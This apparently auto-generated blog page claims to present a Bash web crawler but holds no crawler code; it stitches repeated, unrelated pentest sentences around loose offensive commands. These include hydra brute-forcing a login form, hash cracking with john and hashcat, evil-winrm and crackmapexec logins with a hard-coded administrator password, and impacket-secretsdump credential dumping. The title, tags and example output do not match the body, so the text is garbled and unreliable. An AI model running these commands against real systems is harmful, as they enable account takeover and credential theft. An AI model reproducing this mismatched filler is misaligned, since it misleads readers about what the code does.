---
TitleSEO: "Web Crawler and Spider in Bash | ZureFX"
TitlePost: "Web Crawler and Spider — Bash"
Author: "ZureFX"
Description: "A Bash script for web crawler and spider. Built for security research and automation."
Keywords: "go, python, c, bash"
URL: "https://zurefx.github.io/scripting/script-web-crawler-and-spider-851.html"
URL_IMAGES: ""
Date: "2024-08-11"
Tags: "Go, Python, C, Bash"
Section: "scripting"
Lang: "en"
main_img: "script-web-crawler-and-spider-851"
Permalink: "/scripting/script-web-crawler-and-spider-851.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The backup files contained sensitive information that should not have been accessible. Network traffic analysis revealed unencrypted communications containing user credentials. The kernel version was outdated and vulnerable to a publicly known exploit.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `pwncat`
- `mimikatz`
- `pwncat`

## Implementation

### Core Logic

Network traffic analysis revealed unencrypted communications containing user credentials. Initial enumeration revealed several interesting open ports on the target.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.98.204.226 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Token impersonation allowed elevation to SYSTEM privileges on the target. The scheduled task ran with elevated privileges and could be abused for escalation.

### Helper Functions

Initial enumeration revealed several interesting open ports on the target. The backup files contained sensitive information that should not have been accessible.

```bash
evil-winrm -i 10.42.103.2 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.125.162.84 -u administrator -p 'P@ssw0rd!' --shares
```

## Usage

### Basic Usage

Post-exploitation enumeration revealed a path to domain administrator privileges. The backup files contained sensitive information that should not have been accessible.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.76.203.210
gobuster dir -u http://10.126.112.51/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dir -u http://10.14.139.20/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.46.43.127
```

### Advanced Options

Token impersonation allowed elevation to SYSTEM privileges on the target. Lateral movement was facilitated by reusing discovered credentials across services. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
feroxbuster -h
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p110,587,1521 10.25.19.47 -oN scan.txt
```

## Output

### Example Output

Initial enumeration revealed several interesting open ports on the target. Lateral movement was facilitated by reusing discovered credentials across services.

```
[+] Scanning target...
[+] Found 19 results
[+] Done in 17.36s
```
